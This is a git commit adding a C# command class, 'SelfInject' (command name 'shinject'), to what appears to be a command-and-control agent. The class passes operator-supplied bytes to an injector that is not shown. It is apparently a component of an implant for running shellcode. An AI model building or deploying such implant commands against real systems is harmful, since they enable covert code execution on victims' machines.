02a7e02a21c29f1abddca26511dd6cdca3328b13
WG37 <willg2070@gmail.com>
2025-12-23 13:49:22 +1100

    fix(): renamed to selfInject

---
+++ Agent/Application/Commands/SelfInject.cs
@@ -0,0 +1,30 @@
+﻿using AgentClient.Application.Services.InjectService;
+using AgentClient.Domain.Models.Agents;
+
+namespace AgentClient.Application.Commands
+{
+    public class SelfInject : AgentCommand
+    {
+        public override string Name => "shinject";
+
+        public override string Execute(AgentTask task)
+        {
+            if (task.FileBytes == null)
+            {
+                return "FileBytes cannot be null";
+            }
+
+            var injector = new SelfInjector();
+            var success = injector.Inject(task.FileBytes);
+
+            if (success)
+            {
+                return "Injection successful";
+            }
+            else
+            {
+                return "Injection failed";
+            }
+        }
+    }
+}
